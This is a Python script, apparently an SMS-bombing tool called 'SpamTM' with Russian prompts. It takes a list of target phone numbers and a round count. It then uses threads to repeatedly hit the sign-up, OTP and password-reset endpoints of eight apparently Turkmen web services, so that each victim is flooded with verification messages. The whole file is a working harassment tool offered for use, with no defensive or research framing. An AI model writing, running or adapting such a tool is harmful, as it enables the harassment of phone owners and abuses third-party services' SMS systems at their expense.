# !pip install requests
# !pip install colorama


import requests
from colorama import Back, Fore, init as colinit
from time import sleep
from threading import Thread


class Spammer:
    
	def __init__(self, phones, tries):
		colinit(autoreset=True)

		try:
			self.phones = [int(i) for i in phones.split(",")]
		except ValueError:
			print(Fore.RED + "[Ошибка] неправильно введён номер!")
			exit()

		self.tries = tries
		# print(self.phones)


	def start(self, phone):
		self.belet(phone)
		self.gipertm(phone)
		self.asman_express(phone)
		self.nesipetsin(phone)
		self.saraytm(phone)
		self.awtoyoly(phone)
		self.ynamdar(phone)
		self.markayoly(phone)
		pass


	def attack(self):
		print(""" 
			  _   _             _    
\t\t     /\  | | | |           | |   
\t\t    /  \ | |_| |_ __ _  ___| | __
\t\t   / /\ \| __| __/ _` |/ __| |/ /
\t\t  / ____ \ |_| || (_| | (__|   < 
\t\t /_/    \_\__|\__\__,_|\___|_|\_\      
\n\n              
""")
		
		for _ in range(self.tries):
			for phone in self.phones:
				thread = Thread(target=self.start, args=(phone, ))
				thread.start()

				if _ < self.tries - 1:
					sleep(10)


	def belet(self, phone):
		r = requests.post("https://api.belet.me/api/v1/auth/sign-in",
		json = {"phone":phone,"fingerprint":"110aec2bfcca53e0793f5973e5b86926"})

		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
	    

	def gipertm(self, phone):
		r = requests.post("https://gipertm.com/api/v1/profile/register", 
		json = {"lang":"tk", "username":str(phone)})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")
			

	def asman_express(self, phone):
		r = requests.post("https://shop-adm.asmanexpress.com/api/customers/auth/otp?type=register", 
		json = {"phone":str(phone)})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def nesipetsin(self, phone):
		r = requests.post("https://nesipetsin.com:7070/nesipetsin/mobile/user/register",
		json = {"method":"phone","step":1,"phone":str(phone)[3:],"email":"null","code":"null","password":"null","confirmPassword":"null","errorMsg":"null"})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def saraytm(self, phone):
		r = requests.get("https://saray.tm/verify?phone=" + str(phone)[3:] + "&terms=accept")
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def awtoyoly(self, phone):
		r = requests.post("http://awtoyoly.com.tm/Client/AwtoCheckLogin",
		data = {"phone":str(phone)[3:]})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")


	def ynamdar(self, phone):
		r = requests.post("https://ynamdar.com/v3/forgot_password", 
		data = {"registration-type": "phone", "phone": str(phone)[3:], "action": "send-confirmation-code"})
		
		if r.status_code == 200:
			print(Fore.GREEN + "Сообщение отправлено.")

	
	def markayoly(self, phone):
		r = requests.post("https://api.markayoly.com/api/start-signup",
		json = {"phone":str(phone)[3:]})
		
		if r.status_code == 200:
		    print(Fore.GREEN + "Сообщение отправлено.")
		    


		

if __name__ == "__main__":
	print("""
\t\t  ___                 _ _ _____ __  __ 
\t\t / __|_ __  __ _ _ __| | |_   _|  \/  |
\t\t \__ \ '_ \/ _` | '  \_  _|| | | |\/| |
\t\t |___/ .__/\__,_|_|_|_||_| |_| |_|  |_|
\t\t     |_|                               
""")
	
	phone = input(Back.RED + "Введите номера через запятую: ")
	print(Back.RESET, end="")
	tries = int(input(Back.GREEN + "Введите кол-во кругов: "))
	print(Back.RESET)

	Spammer = Spammer(phone, tries)
	Spammer.attack()

	# input - чтобы после начала потоков в colab програма не остановилась а показывала результат,
	# После завершение просто нажми Enter
	input("Ничего не нажимай пока не завершится! ")